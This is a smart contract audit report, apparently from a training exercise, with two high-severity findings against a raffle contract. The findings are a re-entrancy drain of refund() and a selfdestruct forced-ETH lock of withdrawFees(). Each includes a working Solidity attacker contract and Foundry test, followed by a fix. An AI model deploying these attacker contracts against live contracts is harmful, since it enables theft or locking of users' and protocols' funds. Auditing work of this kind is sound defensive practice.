### [H-1] Re-entrancy Bug which causes users funds + protocol funds to lost.

**Description:**
In the `PuffyRaffle::refund` function , when an attacker calls the refund , he create a contract that can re-enter the contract and keep receiving funds till the contract is drained. All the attacker need to do is to create a contract that has a fallback function that also calls the refund. so every time ETH is sent to the attackers contract, the fallback function get triggered and it keeps calling the refund till the balance of the contract is drained.

**Impact:** All users + protocol funds are drained

**Proof of Concept:**

<details>
<summary>Code</summary>

```solidity
///@notice Attacker contract
contract ReEntrancyAttacker {
    IPuffyRaffle raffle;
    constructor(address _raffle) {
        raffle = IPuffyRaffle(_raffle);
    }
    function refundAgain() public {
        while (address(raffle).balance != 0) {
            raffle.refund(0);
        }
    }

    fallback() external payable {
        refundAgain();
    }

}

///@notice Tests
function testRefundAllFundsInContract() public {
    ReEntrancyAttacker attackerCon = new ReEntrancyAttacker(
        address(puppyRaffle)
    );

    ///@notice attacker enters raffle
    address[] memory players = new address[](4);
    players[0] = address(attackerCon);
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    console.log("Balance of Attacker", address(attackerCon).balance);

    console.log("Balance of PuffyRaffle", address(puppyRaffle).balance);

    console.log("REFUNDING........");

    //attacker calls refund.
    attackerCon.refundAgain();

    console.log("Balance of Attacker", address(attackerCon).balance);

    console.log("Balance of PuffyRaffle", address(puppyRaffle).balance);
    }
```

</details>

**Recommended Mitigation:**
Adhere to the CEI , Checks Effects Interaction.

```diff
-  payable(msg.sender).sendValue(entranceFee);

-  players[playerIndex] = address(0);

+  players[playerIndex] = address(0);
+  payable(msg.sender).sendValue(entranceFee);
```

The Effects should come before any external calls.

### [H-2] Protocol Can lose all protocol fee funds in the contract forever.

**Description:**
In the `PuffyRaffle::withdrawFees` function , the check for the balance to be equal to the `totalFees` in the contract will always fail if additional `ETH` is sent to the contract. Although the function does not have a `fallback` function to receive funds. An attacker could create a contract with `ETH` and call a `selfdestruct` which will push`ETH` to the contract. Thereby causing the protocol to lose the funds in the contract.

**Impact:**
All protocol fees will be lost forever.

**Proof of Concept:**

<details>

<summary>Code</summary>

```solidity
///@notice attacker contract
contract AttackerContract {
function attack(address victim) external payable {
    selfdestruct(payable(victim));
}

fallback() external payable {}

}

function testWithdrawShouldFailedWhenBalanceIsGreaterThanTotalFees() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    puppyRaffle.selectWinner();

    //attack
    AttackerContract attackerCon = new AttackerContract();

    //send funds to attacker contract
    vm.deal(address(attackerCon), 3 ether);

    attackerCon.attack(address(puppyRaffle));

    vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
}
```

</details>

**Recommended Mitigation:** Change the require check.

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

+ require(totalFees != 0, "PuppyRaffle: Not enough fees!");
```
